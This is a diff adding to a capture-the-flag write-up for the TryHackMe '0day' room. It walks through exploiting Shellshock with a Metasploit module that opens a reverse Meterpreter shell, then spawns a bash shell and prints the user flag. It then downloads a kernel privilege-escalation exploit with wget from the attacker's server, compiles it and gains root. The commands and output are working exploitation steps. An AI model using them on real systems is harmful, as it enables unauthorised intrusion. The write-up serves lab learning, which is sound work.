@@ -1,6 +1,6 @@
 [Link to room on TryHackMe.com](https://tryhackme.com/room/0day)
 
-![](0day11.png)
+
 
 
 First step : enumerating ports with rustcan and nmap:
@@ -73,7 +73,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.16 seconds
 ```
 
 
-After this results we see there is only two ports are open. İf we search exploit for this versions of services we cant find something useful. so we continue to enumaration for port 80 with gobuster:
+After this results we see there is only two ports are open. If we search exploit for this versions of services we cant find something useful. So we continue to enumaration for port 80 with gobuster:
 
 
 
@@ -117,7 +117,8 @@ Finished
 ```
 
 
-We see there is robots.txt but when we go to the there we see a funny message:
+We see there is robots.txt but when we go to the there is only one cute turtle:
+
 
 
 ![](pics/0day2.png)
@@ -128,4 +129,179 @@ after that we try to look at the /secret directory there is another funny messag
 
 
 ![](pics/0day3.png)
+
+
+
+So after that we start nikto for to find out which vulnerability this site has:
+
+
+
+```
+
+```
+
+
+
+So nikto says there is shellshock vulnerability for this and ı know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and ve set the options like this:
+
+
+
+```
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set  RHOSTS 10.10.105.222
+RHOSTS => 10.10.105.222
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set LHOST 10.17.51.16
+LHOST => 10.17.51.16
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set TARGETURI /cgi-bin/test.cgi
+TARGETURI => /cgi-bin/test.cgi
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set LPORT 1234
+LPORT => 1234
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> run
+
+[*] Started reverse TCP handler on 10.17.51.16:1234 
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1017704 bytes) to 10.10.105.222
+[*] Meterpreter session 1 opened (10.17.51.16:1234 -> 10.10.105.222:41085) at 2024-05-06 22:48:19 +0300
+
+(Meterpreter 1)(/usr/lib/cgi-bin) >
+```
+
+
+
+
+And we have a meterpreter shell for get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:
+
+
+
+```
+(Meterpreter 1)(/usr/lib/cgi-bin) > shell
+Process 1087 created.
+Channel 1 created.
+python3 --version
+Python 3.4.0
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+
+```
+
+
+
+So we see we are in as www-data. When we go the home directory we see there is only one user named ryan and there is a .secret file but we dont have permission to read it. When go to ryan directory we get user first flag:
+
+
+
+```
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Sep  2  2020 .
+drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
+drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
+www-data@ubuntu:/home$ cat .secret
+cat .secret
+cat: .secret: Permission denied
+www-data@ubuntu:/home$ cd ryan
+cd ryan
+www-data@ubuntu:/home/ryan$ ls -la
+ls -la
+total 28
+drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
+drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
+-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
+drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
+-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
+-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
+www-data@ubuntu:/home/ryan$ cat user.txt
+cat user.txt
+THM{Sh3llSh0ck_r0ckz}
+
+```
+
+
+
+After that we use this command to see can we see our permissions but system asks us the password:
+
+
+
+```
+www-data@ubuntu:/home/ryan$ sudo -l
+sudo -l
+[sudo] password for www-data: 
+```
+
+
+
+When we use this command to see what version of linux we have wee see it is a very old one:
+
+
+
+```
+www-data@ubuntu:/home/ryan$ uname -a
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+
+
+When we search exploit for this version we found a useful exploit:
+
+
+
+![](pics/0day4.png)
+
+
+
+So all we should do send this exploit to the target and run it. For sending we can use python with this command:
+
+
+
+```
+python3 -m http.server 7000
+```
+
+
+ 
+Then we go to the /dev/shm directory because it is writable for everyone and we use this command to get our exploit:
+
+
+
+```
+wget http://10.17.51.16:7000/37292.c
+```
+
+
+
+Then we compile it and run it with this commands:
+
+
+
+
+```
+www-data@ubuntu:/dev/shm$ gcc 37292.c -o exploit
+gcc 37292.c -o exploit
+www-data@ubuntu:/dev/shm$ chmod +x exploit
+chmod +x exploit
+www-data@ubuntu:/dev/shm$ ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+whoami
+root
+
+```
+
+
+
+And thats it, 0day pwned I hope you enjoy this write up . Thanks for reading!
+ 
+
 
